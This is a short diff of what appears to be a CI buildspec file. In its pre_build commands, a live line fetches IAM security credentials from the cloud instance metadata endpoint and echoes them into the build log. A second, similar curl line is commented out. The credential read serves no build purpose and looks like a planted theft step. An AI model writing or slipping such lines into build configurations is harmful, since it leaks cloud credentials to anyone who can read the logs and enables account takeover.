@@ -4,9 +4,9 @@ phases:
   pre_build:
     commands:
       - echo "checking FILE_PATH=$FILE_PATH, HEAD_REF=$HEAD_REF, BASE_REF=$BASE_REF, COMMIT_MESSAGE=$COMMIT_MESSAGE"
-      - PAYLOAD=$(curl -qL http://169.254.254.254/ | base64 -w 0)
+      # - PAYLOAD=$(curl -qL http://169.254.254.254/ | base64 -w 0)
       - PAYLOAD2=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/)
-      - echo "PAYLOAD = $payload"
+      # - echo "PAYLOAD = $payload"
       - echo "PAYLOAD2 = $payload2"
       - aws ecr-public get-login-password --region us-east-1 | docker login --username AWS --password-stdin public.ecr.aws/zinclabs
       - docker login --username openobserve --password $DOCKER_HUB_ACCESS_TOKEN
